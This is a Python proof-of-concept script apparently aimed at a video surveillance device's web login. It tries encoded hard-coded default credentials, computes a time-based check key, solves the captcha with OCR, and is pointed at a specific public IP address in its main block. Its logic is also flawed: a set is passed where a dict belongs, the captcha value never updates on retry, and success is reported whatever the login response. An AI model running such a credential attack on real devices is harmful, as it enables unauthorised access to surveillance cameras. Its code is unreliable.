from poctools import BasicPoc
from poctools.encrypt import md5
from poctools.ocr import new_ocr
from datetime import datetime


class DPTechWeakCipherPoc(BasicPoc):
    jsessionid_uri = "/login.jsp"
    login_uri = "/j_login.auth"
    verify_code_uri = "/func/web_main/validate"

    def __init__(self):
        super(DPTechWeakCipherPoc, self).__init__()
        self.name = "天迈网络视频监控弱密码"

    @staticmethod
    def check_key():
        a = datetime.now()
        s = f"{a.year - 1900}{a.month}{a.weekday()+1}{a.hour}{a.minute}{a.second}001"
        return md5(s)

    def verify(self, url: str) -> bool:
        payload = {
            "user_name": "%89%94%90%83%86", 
            "password": "%67%91%66%86%81%82%83%104%89%94%90%83%86", 
            "language": 1,
            "password1": "",
            "otp_value": "",
            "verify": ""
        }
        while True:
            check = self.check_key()
            verify_code_response = self.get(url + self.verify_code_uri, params={"check", check})
            if verify_code_response is None:
                return False
            print(verify_code_response.content)
            code = new_ocr(verify_code_response.content, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
            if len(code) != 4:
                continue
            payload.setdefault("code", code)
            payload.setdefault("check", check)
            login_response = self.post(url + self.login_uri, data=payload)
            if login_response is None:
                return False
            print(login_response.text)
            return True


if __name__ == '__main__':
    target = "https://219.157.116.100:4443"
    tp = DPTechWeakCipherPoc()
    result = tp.run(target)
    print(f"{target} -> {result}")




